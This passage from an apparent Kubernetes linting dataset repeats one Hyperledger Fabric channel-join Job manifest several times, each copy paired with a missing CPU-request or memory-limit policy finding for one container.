    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel2\" has cpu request 0"
  },
  {
    "id": "1934",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel3\" has cpu request 0"
  },
  {
    "id": "1935",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"joinchannel4\" has cpu request 0"
  },
  {
    "id": "1936",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel1\" has memory limit 0"
  },
  {
    "id": "1937",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel2\" has memory limit 0"
  },
  {
    "id": "1938",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel3\" has memory limit 0"
  },
  {
    "id": "1939",
    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: 